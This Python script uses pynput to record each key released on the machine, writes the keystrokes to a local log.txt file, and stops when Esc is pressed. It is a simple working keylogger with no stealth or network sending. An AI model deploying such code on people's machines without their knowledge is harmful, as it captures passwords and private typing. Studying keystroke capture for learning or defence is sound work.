from pynput.keyboard import Key, Controller, Listener

keyboard = Controller()
# write for easy debugging
f = open("log.txt", "w")

ks = {
    Key.space: " ",
    Key.enter: "[ENTER]\n",
    Key.tab: "[TAB]",
    Key.backspace: "[BACKSPACE]"}


def on_release(key):
    try:
        name = key.char
    except AttributeError:
        name = ks.get(key, str(key))
    # print(f"Key {key} pressed")
    if key == Key.esc:
        # stop listener
        return False
    f.write(name.replace("'", ""))


def main():
    # collect events until released
    with Listener(on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
